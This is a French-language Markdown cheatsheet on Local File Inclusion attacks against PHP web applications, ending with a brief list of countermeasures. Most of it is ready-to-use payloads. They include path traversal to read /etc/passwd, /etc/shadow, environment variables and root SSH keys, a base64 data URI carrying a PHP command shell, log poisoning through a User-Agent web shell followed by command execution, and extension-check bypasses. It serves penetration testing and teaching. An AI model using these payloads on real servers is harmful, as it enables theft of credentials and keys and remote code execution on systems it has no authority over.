# 📂 LFI (Local File Inclusion) - Cheatsheet Cyber

Ce fichier couvre les étapes de **détection** et **exploitation** d'une **Local File Inclusion (LFI)** — une faille critique permettant d’inclure des fichiers locaux depuis le serveur, souvent utilisée pour lire des fichiers sensibles, échapper à des restrictions ou exécuter du code.

---

## ❓ 1. Qu’est-ce qu’une LFI ?

Une **LFI** permet à un attaquant d’inclure un fichier local via un paramètre non sécurisé dans une URL.

Exemple vulnérable :

`index.php?page=about.php`  
> Si utilisé comme : `include($_GET['page']);`

---

## 🔍 2. Étapes pour détecter une LFI

### Identifier les paramètres vulnérables

Chercher dans les URLs :

- `?page=`
- `?file=`
- `?template=`
- `?lang=`

### Tester des chemins standards Unix/Linux

Essayer d'accéder à `/etc/passwd` :

?page=../../../../../../etc/passwd  
> Si affiché, la LFI est présente

---

## 🧪 3. Payloads classiques

?page=../../../../../../etc/passwd  
> Accès au fichier des utilisateurs

?page=../../../../../../var/log/apache2/access.log  
> Essayer d'inclure des fichiers de log

?page=php://filter/convert.base64-encode/resource=index  
> Lire le code source en base64

?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=  
> LFI to RCE via data URI (avec allow_url_include)

---

## 🔄 4. Évasion et contournement

### Techniques d’encodage

- Encodage des `../` → `%2e%2e%2f` ou `%252e%252e%252f`
- Null byte (obsolète mais possible sur anciens serveurs) : `.php%00`

### Sécuriser l’extension

?page=../../../../../../etc/passwd%00.php  
> Bypass de vérification d’extension `.php`

---

## 💣 5. Exploitation avancée

### Lire des fichiers sensibles

?page=../../../../../../etc/shadow  
?page=../../../../../../proc/self/environ  
?page=../../../../../../root/.ssh/id_rsa  
> Lire des fichiers système ou clés SSH

### RCE via injection de log

- Envoyer une requête HTTP avec un payload PHP en user-agent :

User-Agent: <?php system($_GET['cmd']); ?>


- Puis inclure le fichier log :

?page=../../../../../../var/log/apache2/access.log&cmd=id  
> Exécution de commande via fichier log

---

## 🔐 6. LFI + Upload

Si vous pouvez uploader un fichier (image, document…), essayez de l’inclure :

?page=uploads/monshell.jpg  
> Peut contenir du code PHP masqué et s’exécuter

---

## 🛡 7. Contre-mesures

- Ne jamais inclure de fichiers basés sur l’entrée utilisateur
- Utiliser une liste blanche de fichiers valides
- Empêcher le parcours de répertoires (`../`)
- Désactiver `allow_url_include` dans `php.ini`
- Utiliser `realpath()` pour valider les chemins

---

## 📌 Ressources utiles

- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [OWASP - LFI](https://owasp.org/www-community/attacks/Local_File_Inclusion)
- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---
